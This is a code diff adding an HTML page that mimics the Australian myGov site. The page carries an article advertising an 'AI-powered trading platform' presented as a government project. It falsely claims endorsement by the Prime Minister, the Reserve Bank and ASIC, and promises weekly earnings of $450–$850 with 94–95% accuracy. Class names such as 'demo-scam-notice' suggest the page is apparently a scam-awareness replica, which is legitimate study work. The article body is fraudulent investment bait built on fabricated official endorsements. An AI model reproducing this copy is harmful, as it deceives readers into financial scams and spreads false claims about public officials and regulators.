@@ -1,0 +1,974 @@
+<!doctype html>
+<html lang="en">
+ <head>
+  <meta charset="UTF-8">
+  <!-- CSP is set by server.js on Render / npm start; omitted here so partner connect-src can apply -->
+  <meta name="referrer" content="strict-origin-when-cross-origin">
+  <script src="/config.js"></script>
+  <script>
+    window.__MYGOV_MIRROR_CONFIG__ = window.__MYGOV_MIRROR_CONFIG__ || { offlinePrivacyMode: true };
+  </script>
+  <script>
+    (function () {
+      var cfg = window.__MYGOV_MIRROR_CONFIG__ || { offlinePrivacyMode: true };
+      var offline = cfg.offlinePrivacyMode === true;
+      var noop = function () {};
+      window.adobeDataLayer = [];
+      window._satellite = { track: noop, pageBottom: noop, setVar: noop, container: {} };
+
+      if (!offline) {
+        return;
+      }
+
+      try {
+        localStorage.clear();
+        sessionStorage.clear();
+        if (window.indexedDB && indexedDB.databases) {
+          indexedDB.databases().then(function (dbs) {
+            dbs.forEach(function (db) {
+              if (db.name) indexedDB.deleteDatabase(db.name);
+            });
+          });
+        }
+      } catch (e) {}
+
+      function isExternal(url) {
+        if (!url || url.indexOf("http") !== 0) return false;
+        try {
+          var u = new URL(url, window.location.href);
+          return u.origin !== window.location.origin;
+        } catch (e) {
+          return true;
+        }
+      }
+
+      function isTrustedGovernmentLink(url) {
+        try {
+          var parsed = new URL(url, window.location.href);
+          var host = parsed.hostname.toLowerCase();
+          var path = parsed.pathname.replace(/\/$/, "").toLowerCase();
+          return (
+            host === "my.gov.au" ||
+            host.endsWith(".my.gov.au") ||
+            (host === "x.com" && path === "/mygovau") ||
+            (host === "www.youtube.com" && path === "/user/mygovau")
+          );
+        } catch (e) {
+          return false;
+        }
+      }
+
+      var origFetch = window.fetch;
+      if (origFetch) {
+        window.fetch = function (input, init) {
+          var url = typeof input === "string" ? input : (input && input.url);
+          if (isExternal(url)) return Promise.reject(new Error("Offline copy: network disabled"));
+          return origFetch.apply(this, arguments);
+        };
+      }
+
+      var XO = XMLHttpRequest.prototype.open;
+      XMLHttpRequest.prototype.open = function (method, url) {
+        if (isExternal(url)) throw new Error("Offline copy: network disabled");
+        return XO.apply(this, arguments);
+      };
+
+      if (navigator.sendBeacon) {
+        navigator.sendBeacon = function () {
+          return false;
+        };
+      }
+
+      document.addEventListener(
+        "click",
+        function (e) {
+          var a = e.target.closest("a[href]");
+          if (!a) return;
+          var href = a.getAttribute("href");
+          if (!href || href.charAt(0) === "#") return;
+          if (isExternal(href) && !isTrustedGovernmentLink(href)) {
+            e.preventDefault();
+          }
+        },
+        true
+      );
+    })();
+  </script>
+
+<title>Australian Government Project — Government help with money | myGov</title>
+  <meta name="description" content="You may be eligible for a Centrelink payment, or other payments.">
+  <meta name="template" content="generic-content-page-template">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <script>var serviceConfig = { isAuthoringEnv: true, authoringEnv: true };</script>
+  <script> var transitionModalConfig = {"header":"You're leaving myGov Beta","subHeading":"","body":"Select Continue to complete this task in your account.","ctaLabel":"Continue","closeLabel":"Cancel"};</script>
+  <script>var metadataLinkedServiceList = { count: 0, metadata: [] };</script>
+  <link rel="stylesheet" href="etc.clientlibs/servicesaustralia/clientlibs/clientlib-base.min.ACSHASHd41d8cd98f00b204e9800998ecf8427e.css" type="text/css">
+  <link rel="stylesheet" href="etc.clientlibs/servicesaustralia/clientlibs/clientlib-grid.min.ACSHASHdb9d5e7c7d577c192bea16da014631a9.css" type="text/css"> <script type="application/ld+json">
+        {"headline":"Government help with money","datePublished":"2026-04-14T09:33:36.948+10:00","dateModified":"2026-04-14T09:16:59.254+10:00","author":null,"image":[],"publisher":{"name":"myGov","@type":"Organization","url":"content/dam/mygov/images/brand/logos/myGov-logo-cobranded-black.svg"},"@type":"NewsArticle","@context":"https://schema.org"}
+    </script>
+  <meta property="og:title" content="Government help with money">
+  <meta property="og:description" content="You may be eligible for a Centrelink payment, or other payments.">
+  <meta property="og:type" content="website">
+  <meta property="og:site_name" content="myGov">
+  <meta property="og:image" content="content/dam/mygov/public/images/featured/myGov-link-preview-image.png">
+  <meta property="twitter:image" content="content/dam/mygov/public/images/featured/myGov-link-preview-image.png">
+  <meta content="true" name="HandheldFriendly">
+  <meta content="width" name="MobileOptimized">
+  <meta content="yes" name="apple-mobile-web-app-capable">
+  <meta content="black" name="apple-mobile-web-app-status-bar-style">
+  <meta content="yes" name="mobile-web-app-capable">
+  <meta content="IE=edge" http-equiv="X-UA-Compatible">
+  <link href="fonts/mygov-fonts.css" rel="stylesheet">
+  <link rel="apple-touch-icon" sizes="180x180" href="content/dam/mygov/public/images/brand/icon-180x180.png" type="image/png">
+  <link rel="apple-touch-icon" sizes="152x152" href="content/dam/mygov/public/images/brand/icon-152x152.png" type="image/png">
+  <link rel="apple-touch-icon" sizes="144x144" href="content/dam/mygov/public/images/brand/icon-144x144.png" type="image/png">
+  <link rel="apple-touch-icon" sizes="120x120" href="content/dam/mygov/public/images/brand/icon-120x120.png" type="image/png">
+  <link rel="apple-touch-icon" sizes="114x114" href="content/dam/mygov/public/images/brand/icon-114x114.png" type="image/png">
+  <link rel="apple-touch-icon" sizes="76x76" href="content/dam/mygov/public/images/brand/icon-76x76.png" type="image/png">
+  <link rel="apple-touch-icon" sizes="72x72" href="content/dam/mygov/public/images/brand/icon-72x72.png" type="image/png">
+  <link rel="apple-touch-icon" sizes="60x60" href="content/dam/mygov/public/images/brand/icon-60x60.png" type="image/png">
+  <link rel="icon" type="image/png" sizes="32x32" href="content/dam/mygov/public/images/brand/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="content/dam/mygov/public/images/brand/favicon-16x16.png">
+  <link rel="stylesheet" href="etc.clientlibs/servicesaustralia-fed/clientlibs/imported.min.ACSHASHd41d8cd98f00b204e9800998ecf8427e.css" type="text/css">
+  <link rel="stylesheet" href="etc.clientlibs/mygov-unauth-styles/clientlibs/styles.min.ACSHASH837a22fbf634c98d718c55279cebc62f.css" type="text/css">
+  <link rel="stylesheet" href="etc.clientlibs/mygov-common/clientlibs/mygov.gui.kit.min.ACSHASH955530f17f3802d56ab8bd4a299a161f.css" type="text/css">
+  <script src="etc.clientlibs/mygov-common/clientlibs/mygov.gui.kit.min.ACSHASHdacfad48aaffeed9640aeae71db438be.js"></script>
+ 
+  <meta name="robots" content="noindex, nofollow">
+  <style id="demo-fake-banners">
+    /* myGov sets overflow-x:hidden on body, which breaks position:sticky */
+    body {
+      overflow-x: clip !important;
+    }
+    /* Content canvas — match my.gov.au (white page, Roboto, black body copy) */
+    html {
+      color-scheme: light;
+      background-color: #fff;
+      scroll-padding-top: 7rem;
+    }
+    body.generic-content-page {
+      background-color: #fff;
+      color: #000;
+      font-family: "Roboto", sans-serif;
+    }
+    main#main,
+    .main-container.container.responsivegrid,
+    #main .container.responsivegrid {
+      background-color: #fff;
+    }
+    h1.cmp-title__text {
+      color: #000;
+    }
+    .cmp-text gui-rich-text[variant="article"] {
+      display: block;
+      background-color: #fff;
+      color: var(--mygov-text-color-primary, #000);
+      font-family: "Roboto", sans-serif;
+      font-size: var(--mygov-font-size-medium, 1.125rem);
+      font-weight: var(--mygov-font-weight-light, 300);
+      line-height: var(--mygov-font-lineheight-tall, 1.5);
+    }
+    .cmp-text gui-rich-text[variant="article"] p,
+    .cmp-text gui-rich-text[variant="article"] li {
+      color: #000;
+      font-weight: var(--mygov-font-weight-light, 300);
+    }
+    .cmp-text gui-rich-text[variant="article"] p {
+      margin-top: var(--mygov-space-16, 1.875rem);
+      margin-bottom: var(--mygov-space-16, 1.875rem);
+    }
+    .cmp-text gui-rich-text[variant="article"] h2 {
+      font-size: var(--mygov-font-size-5x-large, 1.875rem);
+      line-height: var(--mygov-font-lineheight-normal, 1.25);
+      font-weight: var(--mygov-font-weight-normal, 400);
+      margin-top: var(--mygov-space-21, 2.5rem);
+      margin-bottom: var(--mygov-space-21, 2.5rem);
+      color: #000;
+    }
+    @media screen and (min-width: 48em) {
+      .cmp-text gui-rich-text[variant="article"] h2 {
+        font-size: var(--mygov-font-size-7x-large, 2.25rem);
+      }
+    }
+    .cmp-text gui-rich-text[variant="article"] h3 {
+      font-size: var(--mygov-font-size-4x-large, 1.625rem);
+      line-height: var(--mygov-font-lineheight-normal, 1.25);
+      font-weight: var(--mygov-font-weight-normal, 400);
+      margin-top: var(--mygov-space-16, 1.875rem);
+      margin-bottom: var(--mygov-space-16, 1.875rem);
+      color: #000;
+    }
+    .cmp-text gui-rich-text[variant="article"] ul,
+    .cmp-text gui-rich-text[variant="article"] ol {
+      margin-top: var(--mygov-space-16, 1.875rem);
+      margin-bottom: var(--mygov-space-16, 1.875rem);
+      padding-left: 1.5rem;
+    }
+    /* Tile list is floated in AEM grid — clear so following scam notice isn’t overlaid */
+    #container-190a991be8 > .aem-Grid--8 > .list.aem-GridColumn + .text.l-container {
+      clear: both;
+    }
+    .demo-scam-notice .cmp-text p {
+      color: #000;
+      font-family: "Roboto", sans-serif;
+      font-size: var(--mygov-font-size-medium, 1.125rem);
+      font-weight: var(--mygov-font-weight-light, 300);
+      line-height: var(--mygov-font-lineheight-tall, 1.5);
+      margin: var(--mygov-space-16, 1.875rem) 0;
+    }
+    .demo-scam-notice .cmp-text p strong {
+      font-weight: var(--mygov-font-weight-normal, 400);
+    }
+    a[href],
+    a[href]:hover,
+    a[href]:focus,
+    a[href]:visited,
+    a[href]:active {
+      text-decoration: none !important;
+    }
+    /* Sticky needs visible overflow on AEM layout ancestors */
+    .root.container.responsivegrid,
+    .cmp-container.root.responsivegrid,
+    .aem-Grid.aem-Grid--12 {
+      overflow: visible;
+      background-color: #fff;
+    }
+    /* Sticky header — visual styling comes from myGov GUI kit (#66d3ee, padding, menu) */
+    .header.aem-GridColumn {
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+      align-self: start;
+      background: transparent;
+      box-shadow: none;
+    }
+    gui-header.mygov-header {
+      position: sticky;
+      top: 0;
+      z-index: 1001;
+      width: 100%;
+    }
+    gui-header.mygov-header::part(side-nav-trigger-button) {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.375rem;
+      font-size: 1.125rem;
+      font-weight: 500;
+      color: #000;
+      background: transparent;
+      border: 0;
+      cursor: pointer;
+    }
+    gui-header.mygov-header::part(icon-menu) {
+      width: 2rem;
+      height: 2rem;
+      flex-shrink: 0;
+      color: #000;
+    }
+    gui-header.mygov-header::part(icon-close) {
+      width: 2rem;
+      height: 2rem;
+      flex-shrink: 0;
+      color: #000;
+    }
+    .header.aem-GridColumn gui-nav-bar.mygov-nav-bar {
+      background: #f5f5f5;
+    }
+    @media screen and (max-width: 63.99875em) {
+      .header.aem-GridColumn {
+        position: relative;
+        min-height: var(--header-height-mobile, 108px);
+      }
+      gui-header.mygov-header {
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        width: 100%;
+        box-shadow: none;
+      }
+    }
+    .assistant-panel-closed,
+    .assistant-btn-dsk,
+    .assistant-btn,
+    .cmp-experiencefragment--digital-assistant {
+      display: none !important;
+    }
+    .demo-fake-cta-disabled {
+      display: inline-block; background: #737476; color: #fff; padding: 0.75rem 1.25rem;
+      border-radius: 4px; cursor: not-allowed; text-decoration: line-through;
+    }
+    /* myGov .cmp-text styles set tbody{display:table} — breaks thead alignment */
+    .cmp-text gui-rich-text table.demo-performance-table {
+      display: table;
+      width: 100%;
+      border-collapse: collapse;
+      table-layout: fixed;
+      margin: 1rem 0 1.5rem;
+      border: 1px solid #b8c4ce;
+    }
+    .cmp-text gui-rich-text table.demo-performance-table thead {
+      display: table-header-group;
+    }
+    .cmp-text gui-rich-text table.demo-performance-table tbody {
+      display: table-row-group;
+      width: auto;
+    }
+    .cmp-text gui-rich-text table.demo-performance-table tr {
+      display: table-row;
+    }
+    .cmp-text gui-rich-text table.demo-performance-table th,
+    .cmp-text gui-rich-text table.demo-performance-table td {
+      display: table-cell;
+      box-sizing: border-box;
+      padding: 0.75rem 1rem;
+      text-align: left;
+      vertical-align: middle;
+      border: 1px solid #b8c4ce;
+    }
+    .cmp-text gui-rich-text table.demo-performance-table thead th {
+      background: #d9e4ef;
+      font-weight: 700;
+      line-height: 1.3;
+    }
+    .cmp-text gui-rich-text table.demo-performance-table tbody tr:nth-child(even) {
+      background: #f4f8fb;
+    }
+    .cmp-text gui-rich-text table.demo-performance-table .col-profit,
+    .cmp-text gui-rich-text table.demo-performance-table .col-balance {
+      text-align: right;
+      white-space: nowrap;
+    }
+    .article-lead-photo {
+      margin: 1rem 0 1.5rem;
+      max-width: 640px;
+    }
+    .article-lead-photo img {
+      display: block;
+      width: 100%;
+      max-width: 640px;
+      height: auto;
+      border-radius: 4px;
+    }
+    .article-lead-photo figcaption {
+      margin-top: 0.5rem;
+      font-size: 0.875rem;
+      color: #505050;
+    }
+    .cmp-text gui-rich-text a.article-eligibility-link {
+      color: #495f7d;
+    }
+    .cmp-text gui-rich-text h2 a.article-eligibility-link,
+    .cmp-text gui-rich-text h3 a.article-eligibility-link {
+      color: inherit;
+      font-weight: inherit;
+    }
+    .cmp-text gui-rich-text a.article-eligibility-link:hover,
+    .cmp-text gui-rich-text a.article-eligibility-link:focus {
+      color: #000;
+    }
+    .cmp-text gui-rich-text h2 a.article-eligibility-link:hover,
+    .cmp-text gui-rich-text h2 a.article-eligibility-link:focus,
+    .cmp-text gui-rich-text h3 a.article-eligibility-link:hover,
+    .cmp-text gui-rich-text h3 a.article-eligibility-link:focus {
+      color: inherit;
+    }
+    #check-eligibility {
+      scroll-margin-top: 7rem;
+    }
+    /* AEM float grid — contain floats so footer follows full content height */
+    .main-container > main#main > .aem-Grid.aem-Grid--12::after,
+    #container-190a991be8 > .aem-Grid.aem-Grid--8::after {
+      content: "";
+      display: block;
+      clear: both;
+    }
+    .mygovfooter {
+      clear: both;
+      float: none;
+      width: 100%;
+      background-color: #000;
+    }
+    .mygovfooter gui-footer {
+      display: block;
+      width: 100%;
+      background-color: #000;
+    }
+    .mygovfooter footer {
+      background-color: #000;
+    }
+    .eligibility-cta {
+      margin: 1.5rem 0 2rem;
+    }
+    .demo-performance-table-wrap {
+      overflow-x: auto;
+      -webkit-overflow-scrolling: touch;
+      margin: 1rem 0 1.5rem;
+      max-width: 100%;
+    }
+    .demo-performance-table-wrap .demo-performance-table {
+      margin: 0;
+      min-width: 18rem;
+    }
+    .eligibility-cta__row {
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      gap: 1rem 1.25rem;
+      margin: 0;
+    }
+    .eligibility-cta .eligibility-cta__link.cmp-button {
+      display: inline-flex;
+      flex-shrink: 0;
+      background: #000;
+      color: #fff;
+      box-sizing: border-box;
+      text-decoration: none;
+      font-size: 1.25rem;
+      font-weight: 600;
+      padding: 1rem 2.75rem;
+      min-height: 3.5rem;
+      min-width: 16rem;
+    }
+    .eligibility-cta .eligibility-cta__link.cmp-button:hover,
+    .eligibility-cta .eligibility-cta__link.cmp-button:focus {
+      background: #333;
+      color: #fff;
+    }
+    .eligibility-cta__note {
+      margin: 0;
+      flex: 1;
+      min-width: 16rem;
+      line-height: 1.45;
+    }
+    /* Footer social — match my.gov.au (X + YouTube under Follow us) */
+    gui-footer gui-nav-bars gui-nav-bar.mygov-nav-bar-social-links::part(container) {
+      gap: var(--mygov-space-4, 0.375rem);
+    }
+    /* display:contents drops the nav-item box so links size to the icon only */
+    gui-footer gui-nav-bars gui-nav-bar.mygov-nav-bar-social-links gui-nav-item {
+      display: contents;
+    }
+    gui-footer gui-nav-bars gui-nav-bar.mygov-nav-bar-social-links a.mygov-footer-social-link {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: auto;
+      max-width: none;
+      flex: 0 0 auto;
+      color: #fff;
+      line-height: 0;
+    }
+    /* myGov adds a blank-target ::after icon; hide it on circle social buttons */
+    gui-footer gui-nav-bars gui-nav-bar.mygov-nav-bar-social-links a.mygov-footer-social-link::after {
+      content: none;
+      display: none;
+    }
+    gui-footer gui-nav-bars gui-nav-bar.mygov-nav-bar-social-links a.mygov-footer-social-link:hover,
+    gui-footer gui-nav-bars gui-nav-bar.mygov-nav-bar-social-links a.mygov-footer-social-link:focus {
+      color: #66d3ee;
+    }
+    gui-footer gui-nav-bars gui-nav-bar.mygov-nav-bar-social-links a.mygov-footer-social-link svg {
+      display: block;
+      width: 3.25rem;
+      height: 3.25rem;
+      fill: currentColor;
+    }
+    gui-footer gui-nav-bars gui-nav-bar.mygov-nav-bar-social-links a.mygov-footer-social-link--youtube svg {
+      width: 3.125rem;
+      height: 3.125rem;
+    }
+    /* Footer lockup — Australian Government + myGov (offline icon library fallback) */
+    gui-footer gui-footer-logo a.mygov-footer-lockup-link {
+      display: inline-block;
+      line-height: 0;
+    }
+    gui-footer gui-footer-logo a.mygov-footer-lockup-link img.mygov-footer-lockup {
+      display: block;
+      height: var(--mygov-space-28, 4.25rem);
+      width: auto;
+    }
+    @media screen and (max-width: 47.99775em) {
+      gui-footer gui-footer-logo a.mygov-footer-lockup-link img.mygov-footer-lockup {
+        height: var(--mygov-space-24, 3.25rem);
+      }
+    }
+    @media screen and (max-width: 47.99875em) {
+      .article-lead-photo,
+      .article-lead-photo img {
+        max-width: 100%;
+      }
+      .cmp-text gui-rich-text table.demo-performance-table th,
+      .cmp-text gui-rich-text table.demo-performance-table td {
+        padding: 0.5rem 0.625rem;
+        font-size: 0.875rem;
+        line-height: 1.35;
+      }
+      .cmp-text gui-rich-text table.demo-performance-table .col-profit,
+      .cmp-text gui-rich-text table.demo-performance-table .col-balance {
+        font-size: 0.8125rem;
+      }
+      .eligibility-cta {
+        margin: 1.25rem 0 1.75rem;
+        padding: 0 0.25rem;
+      }
+      .eligibility-cta__row {
+        flex-direction: column;
+        align-items: stretch;
+        gap: 0.75rem;
+      }
+      .eligibility-cta .eligibility-cta__link.cmp-button {
+        width: 100%;
+        max-width: 100%;
+        min-width: 0;
+        justify-content: center;
+        text-align: center;
+        font-size: 1.125rem;
+        padding: 1.125rem 1.5rem;
+        min-height: 3.75rem;
+      }
+      .eligibility-cta__note {
+        min-width: 0;
+        flex: none;
+        font-size: 0.9375rem;
+      }
+    }
+  </style>
+
+ </head>
+ 
+ <body class="generic-content-page base-page page basicpage page-mygov-generic-content" id="generic-content-page" data-cmp-link-accessibility-enabled data-cmp-link-accessibility-text="opens in a new tab">
+<div class="cmp-page__skiptomaincontent"><a class="cmp-page__skiptomaincontent-link" href="#main">Skip to main content</a>
+  </div>
+  <link rel="stylesheet" href="etc.clientlibs/core/wcm/components/page/v2/page/clientlibs/site/skiptomaincontent.min.ACSHASH696ce9a06faa733b225ffb8c05f16db9.css" type="text/css">
+  <div class="root container responsivegrid">
+   <div id="container-main" class="cmp-container root responsivegrid">
+    <div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
+     <div class="header aem-GridColumn aem-GridColumn--default--12"><gui-header class="mygov-header" responsive-breakpoint="63.99875em" side-nav-close-text="Close" side-nav-menu-text="Menu">
+       <gui-header-row>
+        <a class="mygov-header-logo" href="https://my.gov.au/en"> <img class="mygov-header-show-md-below" src="content/dam/mygov/public/images/brand/myGov-logo-black.svg" alt="Australian Government and myGov logo"> <img class="mygov-header-show-lg-above" src="content/dam/mygov/public/images/brand/myGov-logo-cobranded-black.svg" alt="Australian Government and myGov logo"> </a>
+        <div class="mygov-header-nav-container"><gui-nav-bar class="mygov-nav-bar-header mygov-header-show-lg-above" aria-label="top level">
+          <gui-nav-item>
+           <a href="https://my.gov.au/en">Home</a> 
+          </gui-nav-item>
+          <gui-nav-item>
+           <a class="active" href="https://my.gov.au/en/browse"><span>Browse</span></a> 
+          </gui-nav-item>
+          <gui-nav-item>
+           <a href="https://my.gov.au/en/search"> <span>Search</span>
+            <gui-icon name="search"></gui-icon> </a> 
+          </gui-nav-item>
+         </gui-nav-bar>
+         <div class="mygov-header-help-links"><gui-link>
+           <a href="https://my.gov.au/en/create-account">Create account</a> 
+          </gui-link> <gui-link>
+           <a href="https://my.gov.au/en/about/help">Help</a> 
+          </gui-link>
+         </div>
+        </div> 
+       </gui-header-row> 
+      </gui-header> <gui-nav-bar class="mygov-nav-bar mygov-header-show-lg-above" aria-label="Menu">
+       <gui-nav-item>
+        <a aria-current="false" href="https://my.gov.au/en/services/raising-kids">Raising kids</a> 
+       </gui-nav-item>
+       <gui-nav-item>
+        <a aria-current="false" href="https://my.gov.au/en/services/living-arrangements">Living arrangements</a> 
+       </gui-nav-item>
+       <gui-nav-item>
+        <a aria-current="false" href="https://my.gov.au/en/services/ageing">Ageing</a> 
+       </gui-nav-item>
+       <gui-nav-item class="active">
+        <a aria-current="true" href="https://my.gov.au/en/services/work">Work</a> 
+       </gui-nav-item>
+       <gui-nav-item>
+        <a aria-current="false" href="https://my.gov.au/en/services/education">Education</a> 
+       </gui-nav-item>
+       <gui-nav-item>
+        <a aria-current="false" href="https://my.gov.au/en/services/health-and-disability">Health and disability</a> 
+       </gui-nav-item> 
+      </gui-nav-bar>
+      <link rel="stylesheet" href="etc.clientlibs/mygov-common/clientlibs/mygov.common.header.min.ACSHASH3b0031c1e973987c8fa48e36a83c2454.css" type="text/css">
+      <script>
+        (function () {
+          var HEADER_ICONS = {
+            menu:
+              '<svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" height="24" width="24" display="block" fill="currentColor" part="icon"><path d="M3 18v-2h18v2Zm0-5v-2h18v2Zm0-5V6h18v2Z"/></path></svg>',
+            close:
+              '<svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" height="24" width="24" display="block" fill="currentColor" part="icon"><path d="M6.4 19 5 17.6l5.6-5.6L5 6.4 6.4 5l5.6 5.6L17.6 5 19 6.4l-5.6 5.6L19 17.6Z"/></path></svg>',
+          };
+
+          function paintHeaderIcon(icon) {
+            if (!icon || !icon.shadowRoot) return;
+            if (icon.shadowRoot.querySelector("svg")) return;
+            var markup = HEADER_ICONS[icon.getAttribute("name")];
+            if (!markup) return;
+            icon.shadowRoot.innerHTML = markup;
+          }
+
+          function refreshHeaderIcons() {
+            var header = document.querySelector("gui-header.mygov-header");
+            if (!header || !header.shadowRoot) return;
+            header.shadowRoot.querySelectorAll("gui-icon").forEach(paintHeaderIcon);
+          }
+
+          function bootHeaderIcons() {
+            refreshHeaderIcons();
+            window.setTimeout(refreshHeaderIcons, 0);
+            window.setTimeout(refreshHeaderIcons, 250);
+            window.setTimeout(refreshHeaderIcons, 1500);
+          }
+
+          if (customElements.get("gui-icon")) bootHeaderIcons();
+          else customElements.whenDefined("gui-icon").then(bootHeaderIcons);
+          customElements.whenDefined("gui-header").then(bootHeaderIcons);
+        })();
+      </script>
+     </div>
+     <div class="page-taxonomy aem-GridColumn aem-GridColumn--default--12">
+      <div>
+      </div>
+     </div>
+     <div class="main-container container responsivegrid aem-GridColumn aem-GridColumn--default--12">
+      <main id="main" class="cmp-container root responsivegrid" role="main" data-section="content">
+       <div class="aem-Grid aem-Grid--12 aem-Grid--default--12 aem-Grid--xxs--12 aem-Grid--s--12 aem-Grid--xl--12 aem-Grid--xs--12 aem-Grid--l--12 aem-Grid--m--12 ">
+        <div class="breadcrumb aem-GridColumn--xxs--none aem-GridColumn--offset--xs--1 aem-GridColumn--default--none aem-GridColumn--xxs--10 aem-GridColumn--xl--8 aem-GridColumn--m--10 aem-GridColumn--xs--none aem-GridColumn--offset--default--2 aem-GridColumn--s--10 aem-GridColumn--l--8 aem-GridColumn--offset--l--2 aem-GridColumn--offset--xxs--1 aem-GridColumn--s--none aem-GridColumn--offset--xl--2 aem-GridColumn--l--none aem-GridColumn aem-GridColumn--default--8 aem-GridColumn--xs--10 aem-GridColumn--xl--none aem-GridColumn--offset--m--1 aem-GridColumn--m--none aem-GridColumn--offset--s--1">
+         <gui-breadcrumbs id="breadcrumb" class="mygov-breadcrumbs-responsive cmp-breadcrumb" aria-label="Breadcrumb" itemscope itemtype="http://schema.org/BreadcrumbList">
+          <gui-breadcrumb itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+           <gui-link>
+            <a class="gui-breadcrumb-link" itemprop="item" href="#"> <span itemprop="name">Home</span> </a>
+            <meta itemprop="position" content="1"> 
+           </gui-link> 
+          </gui-breadcrumb>
+          <gui-breadcrumb itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+           <gui-link>
+            <a class="gui-breadcrumb-link" itemprop="item" href="#"> <span itemprop="name">Work</span> </a>
+            <meta itemprop="position" content="2"> 
+           </gui-link> 
+          </gui-breadcrumb>
+          <gui-breadcrumb itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+           <gui-link>
+            <a class="gui-breadcrumb-link" itemprop="item" href="#"> <span itemprop="name">Managing the cost of living</span> </a>
+            <meta itemprop="position" content="3"> 
+           </gui-link> 
+          </gui-breadcrumb>
+          <gui-breadcrumb itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+           <gui-link>
+            <a class="gui-breadcrumb-link" itemprop="item"> <span itemprop="name">Government help with money</span> </a>
+            <meta itemprop="position" content="4"> 
+           </gui-link> 
+          </gui-breadcrumb> 
+         </gui-breadcrumbs>
+         <link rel="stylesheet" href="etc.clientlibs/mygov-info/clientlibs/mygov.info.breadcrumb.min.ACSHASHcee3f81f7fb838f5fb63e7f2c1c716d6.css" type="text/css">
+        </div>
+
+        <div class="page-title title aem-GridColumn--xxs--none aem-GridColumn--offset--xs--1 aem-GridColumn--default--none aem-GridColumn--xxs--10 aem-GridColumn--xl--8 aem-GridColumn--m--10 aem-GridColumn--xs--none aem-GridColumn--offset--default--2 aem-GridColumn--s--10 aem-GridColumn--l--8 aem-GridColumn--offset--l--2 aem-GridColumn--offset--xxs--1 aem-GridColumn--s--none aem-GridColumn--offset--xl--2 aem-GridColumn--l--none aem-GridColumn aem-GridColumn--default--8 aem-GridColumn--xs--10 aem-GridColumn--xl--none aem-GridColumn--offset--m--1 aem-GridColumn--m--none aem-GridColumn--offset--s--1">
+         <div id="page-title-f1b1b2b24b" class="cmp-title">
+          <h1 class="cmp-title__text">Government help with money</h1>
+         </div>
+        </div>
+        <div class="container responsivegrid aem-GridColumn--xxs--none aem-GridColumn--offset--xs--1 aem-GridColumn--default--none aem-GridColumn--xxs--10 aem-GridColumn--xl--8 aem-GridColumn--m--10 aem-GridColumn--xs--none aem-GridColumn--offset--default--2 aem-GridColumn--s--10 aem-GridColumn--l--8 aem-GridColumn--offset--l--2 aem-GridColumn--offset--xxs--1 aem-GridColumn--s--none aem-GridColumn--offset--xl--2 aem-GridColumn--l--none aem-GridColumn aem-GridColumn--default--8 aem-GridColumn--xs--10 aem-GridColumn--xl--none aem-GridColumn--offset--m--1 aem-GridColumn--m--none aem-GridColumn--offset--s--1">
+         <div id="container-190a991be8" class="cmp-container root responsivegrid">
+          <div class="aem-Grid aem-Grid--8 aem-Grid--default--8">
+           <div class="text l-container aem-GridColumn--default--8">
+            <div class="cmp-text"><gui-rich-text variant="article" context="body">
+              <h2><a class="article-eligibility-link" href="#check-eligibility">Government and Major Banks Launch AI System to Support Supplementary Universal Income for Australians</a></h2>
+              <figure class="article-lead-photo">
+               <img src="content/dam/mygov/public/images/article/press-conference.png" alt="Prime Minister Anthony Albanese and RBA Governor Michelle Bullock meeting with bank chief executives" width="1536" height="1024" loading="lazy">
+               <figcaption><em>Prime Minister Anthony Albanese and Reserve Bank of Australia Governor Michelle Bullock meet with chief executives of Australia's six largest banks to discuss the launch of a new AI trading platform.</em></figcaption>
+              </figure>
+              <p>Over 142,000 users across Australia have registered for this AI-powered trading system. With ASIC-regulated protection, robust investor safeguards, and up to 94% accuracy, early users report consistent weekly earnings with just 45 minutes daily.</p>
+              <p>Australian residents are quietly earning <a class="article-eligibility-link" href="#check-eligibility">$450–$850</a> per week with a new AI-powered trading platform that's just opened to the public. With over 142,000 users across Australia already registered, this could be your chance to explore the platform.</p>
+              <h2 id="why-matters"><a class="article-eligibility-link" href="#check-eligibility">Why This Australian Launch Matters Now</a></h2>
+              <p>While ChatGPT and other AI tools dominate headlines, a quieter revolution has been brewing: artificial intelligence designed specifically to simplify online income for Australian <a class="article-eligibility-link" href="#check-eligibility">citizens</a>, not just tech experts or wealthy investors.</p>
+              <p>This government project has just officially launched across Australia, bringing automated tools to ordinary Australians. It is designed to help users explore trading strategies with minimal time investment.</p>
+              <h2 id="how-works"><a class="article-eligibility-link" href="#check-eligibility">How It Actually Works</a></h2>
+              <p>The government project connects users to an AI system that scans global financial markets, analysing currencies, commodities, and indices in real time. Instead of spending hours studying charts, the AI identifies potential opportunities and provides signals.</p>
+              <p>Once you've registered, the system begins monitoring markets. You can adjust risk settings, pause activity, or withdraw funds; the platform handles analysis while you make the final decisions.</p>
+              <h2 id="why-joined"><a class="article-eligibility-link" href="#check-eligibility">Why 142,000+ Australian Residents Have Already Joined</a></h2>
+              <ul>
+               <li><strong>Start earning in less than 24 hours</strong> — No financial background is required to review the platform and its available tools.</li>
+               <li><strong>ASIC-regulated protection</strong> — The service states that funds are held with an ASIC-regulated broker.</li>
+               <li><strong>Reported testing results</strong> — Provided by the RBA Fiscal team, with 95% accuracy in the calculation of trading performance. For a <a class="article-eligibility-link" href="#check-eligibility">$350 AUD</a> investment, maximum calculated risk was <a class="article-eligibility-link" href="#check-eligibility">$17.5 AUD</a> in less than 5% of performed trades.</li>
+              </ul>
+              <p>Check if the program is still available in your area.</p>
+              <h2 id="testing"><a class="article-eligibility-link" href="#check-eligibility">Our 30-Day Testing Results</a></h2>
+              <p>RBA financial engineers spent four weeks testing and fine-tuning the platform and tracking activity, withdrawals, and market conditions. Results vary based on market conditions, deposit amount, and risk settings. With a beginners account, there is a stop loss to restrict the account from losing <a class="article-eligibility-link" href="#check-eligibility">money</a>.</p>
